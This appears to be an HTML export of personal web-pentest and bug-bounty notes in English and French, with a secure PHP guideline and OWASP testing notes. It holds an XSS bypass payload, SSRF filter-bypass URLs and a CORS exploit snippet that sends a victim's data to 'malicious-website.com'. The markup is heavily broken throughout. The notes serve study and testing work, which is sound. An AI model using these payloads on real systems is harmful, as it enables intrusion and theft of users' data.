            <strong>&lt;script>onerror=alert;throw 1&lt;/script></strong>
<ul>

<li><strong>window[/loc.source%2B/ation/.source] ( Regex for bypass words filtered )</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - SSRF  :

<li>

<table>
  <tr>
   <td>
<ul>

<li><strong>payload for finding internal service :</strong> 
<ul>
 
<li><strong><a href="http://127.1/">http://127.1/</a></strong>
 
<li><strong><a href="http://0000::1:80/">http://0000::1:80/</a></strong>
 
<li><strong><a href="http://[::]:80/">http://[::]:80/</a></strong>
 
<li><strong><a href="http://2130706433/">http://2130706433/</a></strong>
 
<li><strong><a href="http://whitelisted@127.0.0.1">http://whitelisted@127.0.0.1</a></strong>
 
<li><strong><a href="http://0x7f000001/">http://0x7f000001/</a></strong>
 
<li><strong><a href="http://017700000001">http://017700000001</a></strong>
 
<li><strong><a href="http://0177.00.00.01">http://0177.00.00.01</a></strong>
 
<li><strong>http://0xd8.0x3a.0xd6.0xe3</strong>
 
<li><strong>http://0xd83ad6e3</strong>
 
<li><strong>http://0xd8.0x3ad6e3</strong>
 
<li><strong>http://0xd8.0x3a.0xd6e3</strong>
 
<li><strong>http://0330.072.0326.0343</strong>
 
<li><strong>http://000330.0000072.0000326.00000343</strong>
 
<li><strong>http://033016553343</strong>
 
<li><strong>http://3627734755</strong>
 
<li><strong>http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37</strong>
 
<li><strong>http://216.0x3a.00000000326.0xe3</strong>
 
<li>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>You can also use Weird Unicode characters for bypassing</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>You can also utilize the nio.io service, which is a simple wildcard DNS service for any IP address :</strong> 
<ul>
 
<li><strong>10.0.0.1.nip.io maps to 10.0.0.1</strong>
 
<li><strong>app.10.8.0.1.nip.io maps to 10.8.0.1</strong>
 
<li><strong>customer1.app.10.0.0.1.nip.io maps to 10.0.0.1</strong>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Use absolute URL on HTTPs syntax protocol</strong> 
<ul>
 
<li><strong>GET [ENTIRE_URL] HTTP/1.1 instead of GET /[FILE] HTTP/1.1</strong>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - Login/password form  :

<table>
  <tr>
   <td>
<ul>

<li><strong>Check if there is a rate limiting login attempts ( against brute forcing )</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Weak password policy ( see in password reset also )</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Username enumeration</strong> 
<ul>
 
<li><strong>Status codes</strong>
 
<li><strong>Error messages</strong>
 
<li><strong>Response times</strong>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Application logins that are not protected by TLS encryption</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>2FA :</strong> 
<ul>
 
<li>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>SQL Injection</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>BB - CORS :

<table>
  <tr>
   <td>
<ul>

<li><strong>Check there is the header Access-Control-Allow-Credentials to be set to true ( allow the victim’s browser to send the credentials by the cookie )</strong>
    <strong>If this is the case, you can then try an HTTP header injection.</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Check if the Origin Header is reflected in the header responses of ACAO header.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
<img src="images/image410.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Send the header “Origin : null”  and see if the vulnerable application whitelists the null origin. If the target accepts a null origin, you can use tricks to generate this header in the victim with your payload.</strong> 
<ul>
 
<li><strong>example of trick:</strong>
<strong><code>&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script></code></strong>
<strong><code>var req = new XMLHttpRequest();</code></strong>
<strong><code>req.onload = reqListener;</code></strong>
<strong><code>req.open('get','vulnerable-website.com/sensitive-victim-data',true);</code></strong>
<strong><code>req.withCredentials = true;</code></strong>
<strong><code>req.send();</code></strong>
<strong><code>function reqListener() {</code></strong>
<strong><code>location='malicious-website.com/log?key='+this.responseText;</code></strong>
<strong><code>};</code></strong>
<strong><code>&lt;/script>">&lt;/iframe></code></strong> 
</ul> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Advance Regexp bypasses</strong>
<strong>Most of the regex used to identify the domain inside the string will focus on alphanumeric ASCII characters and “.-”. But some browser support other characters in a domain name ( see the image below ) :</strong> 
<ul>
 
<li>

<p>

<img src="images/image411.png" width="" alt="alt_text" title="image_tooltip">

</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Attack from an XSS inside a whitelisted subdomain</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Try to add a callback parameter in the request. Maybe the page was prepared to send the data as JSONP. ( Content-Type: application/javascript )</strong>

<img src="images/image412.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong><a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a> :</strong> 
<ul>
 
<li><strong>cors_scan.py </strong>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - Web Cache Poisoning :

<table>
  <tr>
   <td>
<ul>

<li><strong>Pour Supprimer une page du cache : </strong> 
<ul>
 
<li><strong>Ajouter le header “Cache-control Ou Pragma” avec comme valeur "non-cache" à la requête envoyée.</strong>
        <strong>Exemple :</strong> 
<ul>
 
<li>
<img src="images/image413.png" width="" alt="alt_text" title="image_tooltip">

</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - HTTP response header injection :

<table>
  <tr>
   <td>
<ul>

<li><strong>Tenter une attaque de type HTTP Response Splitting into XSS sur la 2ème réponse.</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - HTTP Host header attacks :

<table>
  <tr>
   <td>
<ul>

<li><strong>Try to supply an arbitrary, unrecognized domain name via the Host header to see what happens.</strong>

<li>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Injection in port :</strong>
<img src="images/image414.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Classic techniques to bypass whitelist site :</strong>
    <strong>Example :</strong> 
<ul>
 
<li>
<img src="images/image415.png" width="" alt="alt_text" title="image_tooltip">

</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Inject duplicate Host headers :</strong> 
<ul>
 
<li>
<img src="images/image416.png" width="" alt="alt_text" title="image_tooltip">

 
<li>
<img src="images/image417.png" width="" alt="alt_text" title="image_tooltip">

</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Use absolute URL on HTTPs syntax protocol</strong>
    <strong>Example :</strong> 
<ul>
 
<li><strong>GET [ENTIRE_URL] HTTP/1.1 </strong>
<p>

        <strong>HOST : [ DOMAIN  / IP /  PAYLOAD ]</strong>
<p>

        <strong>Instead of </strong>
<ul>

<li><strong>GET /[FILE] HTTP/1.1</strong>
<p>

        <strong>HOST : [ DOMAIN  / IP /  PAYLOAD ]</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - API :

<table>
  <tr>
   <td>
<ul>

<li><strong>Search for API patterns inside the api and try to use it to discover more.</strong>
    <strong>If you find  /api/albums/&lt;album_id>/photos/&lt;photo_id> you could try also things like  /api/posts/&lt;post_id>/comment/. Use some fuzzer to discover this new endpoints.</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Something like the following example might get you access to another user’s photo album:</strong>
    <strong>/api/MyPictureList → /api/MyPictureList?user_id=&lt;other_user_id></strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<img src="images/image418.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
  <tr>
   <td>
<img src="images/image419.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>HTTP request method change (GET, POST, PUT, DELETE, PATCH, INVENTED)</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<img src="images/image420.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
<img src="images/image421.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<img src="images/image422.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>https://github.com/shieldfy/API-Security-Checklist</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
  <tr>
   <td>
    <strong>-</strong>
   </td>
  </tr>
</table>


<ul>

<li>BB - Information Disclosure/gathering :

<table>
  <tr>
   <td>
<ul>

<li><strong>Nmap :</strong>

<table>
  <tr>
   <td>
<strong>nmap 123.123.123.1/24</strong>
</li>
</ul>
</li>
</ul>
   </td>
   <td><strong>plage d’adresse</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -sn 123.123.123.1</strong>
   </td>
   <td><strong>If you just want to find which hosts are alive</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -Pn host</strong>
   </td>
   <td><strong>Sometimes, hosts don’t respond to ping. To skip ping checks and just scan the host ports anyway, use -Pn.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -iL ./hosts.txt</strong>
   </td>
   <td><strong>To scan a list of hosts from a file</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-sS</strong>
   </td>
   <td><strong>TCP SYN scan. This is the default scan type.  Other scan types can be useful for stealth or probing firewalls but may sacrifice accuracy or speed</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-sU</strong>
   </td>
   <td><strong>UDP ports scan</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -p 1–65535 host</strong>
   </td>
   <td><strong>You can specify which ports to scan with</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -p 23,23,25,110,80–90,U:53,1000–2000</strong>
   </td>
   <td><strong>Pour attaquer EDRA cette dinde</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -sV — version-intensity 9</strong>
   </td>
   <td><strong>When Nmap finds an open port, it can probe further to discover what service it is running if you specify -sV. You can set how intense you want the probes to be from 0 (light probe, fast but not accurate) to 9 (try all probes, slow but accurate)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nmap -O host</strong>
   </td>
   <td><strong>operating system guessing</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td><strong>You can also adjust the speed that nmap scans at. using -T&lt;0–5></strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


   </td>
  </tr>
  <tr>
   <td>


* **Burp Crawler**
   </td>
  </tr>
  <tr>
   <td>
* **ffuf**
    * 
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
</table>


<ul>

<li>BB - Business logic vulnerabilities :

<table>
  <tr>
   <td>
<ul>

<li><strong>Valeurs négatives</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Changer le type de la variable</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>Dépasser des limites sur les valeurs des variables</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<ul>

<li>BB - GraphQL :

<table>
  <tr>
   <td>
<ul>

<li><strong>Inject Introspection schéma</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>BB - APK :
<img src="images/image423.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
<ul>

<li>
Non technique, normes, ...
<h3>
    PCI DSS</h3>


<ul>

<li><strong>L’acronyme PCI DSS (Payment Card Industry Data Security Standard) désigne les normes de sécurité des données applicables à l’industrie des cartes de paiement. Élaborée par le conseil des normes de sécurité PCI, la norme PCI DSS vise à réduire la fraude en ligne. Toute organisation qui traite les données de titulaires de cartes de paiement est tenue de s’y conformer. La conformité est validée par un évaluateur de sécurité homologué, un évaluateur de la sécurité en interne, ou par le biais d’un questionnaire d’auto-évaluation pour les entreprises qui traitent de plus petits volumes de données de cartes bancaires.</strong>
<p>

    <strong>La norme PCI DSS est une norme mondiale qui n’est pas obligatoire au regard de la loi aux États-Unis — la réglementation applicable aux données des titulaires de cartes diffère d’un état à l’autre, et la non-conformité se traduit le plus souvent par de lourdes amendes pour l’entreprise concernée.</strong>
</p>
<p>

    <strong>Pourquoi la norme PCI DSS est-elle si importante ?</strong>
</p>
<p>

    <strong>En appliquant la norme PCI DSS, votre entreprise indique prendre les mesures appropriées pour protéger les données des titulaires de cartes contre le vol sur Internet et toute utilisation frauduleuse. L’impact est aussi fort pour l’entreprise que pour ses clients, car les conséquences d’une cyberattaque peuvent se traduire par une perte de revenus, de clients et de confiance, sans parler du préjudice pour la marque.</strong>
</p>
<ul>

<li><strong>L’acronyme PSSI (Politique de sécurité du système d'information) définit l’intégralité de la stratégie de sécurité informatique de l’entreprise. Elle se traduit par la réalisation d’un document qui regroupe l’ensemble des règles de sécurité à adopter ainsi que le plan d’actions ayant pour objectif de maintenir le niveau de sécurité de l’information dans l’organisme.</strong>
<p>

    <strong>La PSSI, élaborée « sur-mesure » pour chaque établissement, décrit l’ensemble des enjeux, des besoins, des contraintes, ainsi que des règles à adopter propres à chaque structure. Elle doit être validée par la direction et prise en compte par chaque collaborateur.</strong>
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li>Secure PHP Software Guideline
<ul>

<li>Dependency Management 
<ul>
 
<li>In short: Use Composer.  
<ul>
  
<li>If you aren't using Composer to manage your dependencies, you will eventually (hopefully later but most likely sooner) end up in a situation where one of the software libraries you depend on becomes severely outdated.
<ul>

<li>Recommended Packages
<p>

        Regardless of what you're building, you will almost certainly benefit from these dependencies. This is in addition to what most PHP developers recommend :
</p>

<table>
  <tr>
   <td>
<ul>

<li>roave/security-advisories 
<ul>
 
<li>ensure that your project doesn't depend on any known-vulnerable packages.
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>vimeo/psalm 
<ul>
 
<li>Psalm is a static analysis tool that helps identify possible bugs in your code. Regardless of which static analysis tool you use, we recommend you bake it into your Continuous Integration workflow (if applicable) so that it is run after every code change.
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
</table>


<h3>
    Subresource Integrity</h3>


<p>
Subresource integrity (SRI) allows you to pin a hash of the contents of the file you expect the CDN to serve. SRI as currently implemented only allows the use of secure cryptographic hash functions, which means that it's infeasible for an attacker to generate a malicious version of the same resources that produce the same hash as the original file.
</p>
<p>
Example :
</p>
<p>

<img src="images/image424.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h3>Document Relationships</h3>


<p>

<img src="images/image425.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h3>Database Interaction</h3>


<p>
If you're writing SQL queries yourself, make sure that you're using prepared statements.
</p>
<p>
If you're writing SQL queries yourself, make sure that you're using prepared statements, and that any information provided by the network or filesystem is passed as a parameter rather than concatenated into the query string.
</p>
<p>
Furthermore, make sure you're not using emulated prepared statements.
</p>
<p>

<img src="images/image426.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h3>                File Uploads</h3>


<ul>

<li>
Security Web Testing Guide
<p>
Based on : <a href="https://owasp.org/www-project-web-security-testing-guide/v42/">https://owasp.org/www-project-web-security-testing-guide/v42/</a>
</p>
<h3>
Information Gathering</h3>



<table>
  <tr>
   <td>
<ul>

<li>General

<li>Utiliser plusieurs navigateurs pour chercher des infos sur la cible en écrivant juste l’URL du site au minimum: 
<ul>
 
<li>Google, Bing(Support SO), DuckDuckGo(Support SO), Startpage (Support SO), Wayback Machine
 
<li>Utiliser les SO 
<ul>
 
<li>Looker les fichiers suivants pour trouver un maximum de page et d’info sur un site :  
<ul>
  
<li>robots.txt
  
<li>sitemap.xml
  
<li>human.txt
  
<li>security.txt
  
<li>.well-known/
  
<li>sitemap.xml
<ul>

<li>Banner grabbing : by eliciting responses to (malformed) requests, and examining its response header to get information about the type of server. Often done by automatic tools ( Nikto, Nmap, netcraft). 
<ul>
 
<li>In cases where the server information is obscured, testers may guess the type of server based on the ordering of the header fields.
<ul>

<li>Examining error responses
<ul>

<li>Defining the version of the server and see if it’s up-to-date.
<ul>

<li>Look through all META tag to discover different pages
<ul>

<li>Use Netcraft tool
<ul>

<li>Dans le cas ou la target c’est juste une adresse IP et tu dois trouver des sites web venant de cette adresse : 
<ul>
 
<li>Cas 1) Differents sites venant d’URL differente (http://www.example.com/url1 http://www.example.com/url2 http://www.example.com/url3) => assez rare  
<ul>
  
<li>See if you can directory browsing
  
<li>If testers suspect the existence of such hidden applications on www.example.com they could search using the search operator and examine the result of a query for site: <a href="www.example.com">www.example.com</a>.
  
<li>Dictionary-style searching (or “intelligent guessing”) like mail or administrative interfaces, from a base URL could yield some results. Vulnerability scanners may help in this respect. 
<ul>
 
<li>Cas 2) Non-standard Ports  
<ul>
  
<li>A port scanner such as nmap (FUZZ) : nmap –Pn –sT –sV –p0-65535 192.168.1.100
  
<li> 
<ul>
 
<li>Cas 3) Virtual Hosts ( one IP => many DNS names)  
<ul>
  
<li>DNS Zone Transfers   
<ul>
   
<li>If a symbolic name is known for [IP] (let it be www.owasp.org),  its name servers can be determined by means of tools such as nslookup, host, or dig, by requesting DNS NS records : 
                    
<img src="images/image427.png" width="" alt="alt_text" title="image_tooltip">

<p>

                    
<img src="images/image428.png" width="" alt="alt_text" title="image_tooltip">
  
<ul>
  
<li>DNS Inverse Queries ( IP => domain)   
<ul>
   
<li>dig -x [IP]
   
<li>nslookup [IP]
<ul>

<li>https://hackertarget.com/reverse-ip-lookup/ => (very complex search database that has recorded the IP addresses of websites it has crawled)
<ul>

<li>Bing research : ip:”[IP]”  
<ul>
  
<li>Web-based DNS Searches   
<ul>
   
<li>https://searchdns.netcraft.com/?host  
<ul>
  
<li>Reverse-IP Services   
<ul>
   
<li>the testers query a web-based application instead of a name server.    
<ul>
    
<li>https://reverseip.domaintools.com/ (requires free membership)
    
<li>DNSstuff (multiple services available)
    
<li>Net Square (multiple queries on domains and IP addresses, requires installation)  
<ul>
  
<li>Googling dorking  
<ul>
  
<li>Digital Certificates   
<ul>
   
<li>If the server accepts connections over HTTPS, then the Common Name (CN) and Subject Alternate Name (SAN) on the certificate may contain one or more hostnames.
<p>

                The CN and SAN can be obtained by manually inspecting the certificate, or through other tools such as OpenSSL: 
<ul>
 
<li>openssl s_client -connect 93.184.216.34:443 &lt;/dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:'
<ul>

<li>Search for comments (Sometimes, they forget about the comments and they leave them in production environments.)

<p>

<img src="images/image429.png" width="" alt="alt_text" title="image_tooltip">

<ul>

<li>review JS file (non library) (Look for values such as: API keys, internal IP addresses, sensitive routes, or credentials.)
<ul>

<li>Identifying Source Map Files : Testers can also find source map files by adding the “.map” extension after the extension of each external JavaScript file. Check source map files for any sensitive information that can help the attacker gain more insight about the application.
<ul>

<li>Use Attack Surface Detector (Burp suite Extension tool)  to investigates the source code and uncovers the endpoints of a web application
<ul>

<li>la plupart des éléments (presque tous) dans la catégorie **information disclosure** peuvent être effectué avec des tools
<ul>

<li>Looker le Header X-Powered-By ( ou autre dérivé comme X-Generator) pour trouver des frameworks ou applications utilisées
<ul>

<li>Looker le nom du cookie
<ul>

<li>Looker si il y a des commentaires qui peuvent nous indiquer des framework ou info laissées par les devs.
<ul>

<li>Chercher des fichiers liées à des frameworks (FUZZ) pour trouver leur présence
<ul>

<li>Looker l'extension des fichiers dans l’URL
<ul>

<li>Pour remédier à la découverte des frameworks utilisés d’un point de vue des Hackers, on essaye de tout cacher comme information. Mais c’est plus pour le freiner qu’un vrai moyen de sécurité.
<ul>

<li>Autour du serveur web, essayer de trouver tous les éléments connectés à lui (reverse proxy, base de données, …) pour mieux comprendre la cible
<ul>

<li>Outil de récup d’info : Whatweb : <em>./whatweb [URL]</em>
<ul>

<li>Use recon-ng (very cool tool for information gathering)
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Shodan 
<ul>
 
<li>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<h3>
Configuration and Deployment Management Testing</h3>



<table>
  <tr>
   <td>
<ul>

<li>
Review each version (if possible) of each element related to the server web (DB, proxy, …)
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Review if no default unsecure ( more generally unused) configuration component is present : 
<ul>
 
<li>Default files
 
<li>Default non-used configuration
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Various tools, documents, or checklists (found on the internet) can be used to give IT and security professionals a detailed assessment of target systems’ conformance to various configuration baselines or benchmarks.
<ul>

<li>Configuration Review in Gray-Box Testing common guidelines for application server : 
<ul>
 
<li>Only enable server modules that are needed for the application. 
<ul>
 
<li>Handle server errors (40x or 50x) for  with custom-made pages instead of with the default web server pages. Specifically, make sure that any application errors will not be returned to the end user and that no code is leaked through these errors since it will help an attacker.
        <a href="https://fr.wikipedia.org/wiki/Liste_des_codes_HTTP">https://fr.wikipedia.org/wiki/Liste_des_codes_HTTP</a> 
<ul>
 
<li>Make sure that the server software runs with minimized privileges in the operating system.
<ul>

<li>Make sure the server software properly logs both legitimate access and errors.
<ul>

<li>Make sure that the server is configured to properly handle overloads and prevent Denial of Service attacks. Ensure that the server has been performance-tuned properly.
<ul>

<li>Logging : 
<ul>
 
<li>Do the logs contain sensitive information? 
<ul>
 
<li>Are the logs stored in a dedicated server? 
<ul>
 
<li>Can log usage generate a Denial of Service condition? 
<ul>
 
<li>How are they rotated? Are logs kept for the sufficient time? 
<ul>
 
<li>How are logs reviewed? Can administrators use these reviews to detect targeted attacks? 
<ul>
 
<li>How are log backups preserved? 
<ul>
 
<li>Is the data being logged data validated (min/max length, chars etc) prior to being logged?
<ul>

<li>Some applications might, for example, use GET requests to forward form data which will be seen in the server logs. This means that server logs might contain sensitive information (such as usernames as passwords, or bank account details). This sensitive information can be misused by an attacker if they obtained the logs.
<ul>

<li>Also, in some jurisdictions, storing some sensitive information in log files, such as personal data, might oblige the enterprise to apply the data protection laws that they would apply to their back-end databases to log files too.
<ul>

<li>If the server is compromised its logs can be wiped out by the intruder to clean up all the traces of its attack and methods. So, it is wiser to keep logs in a separate location and not in the web server itself.
<ul>

<li>Logs can introduce a Denial of Service condition if they are not properly stored. Typically in UNIX systems logs will be located in /var (although some server installations might reside in /opt or /usr/local) and it is important to make sure that the directories in which logs are stored are in a separate partition.
<ul>

<li>Log statistics or analysis should not be generated, nor stored, in the same server that produces the logs. Otherwise, an attacker might, through a web server vulnerability or improper configuration, gain access to them
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
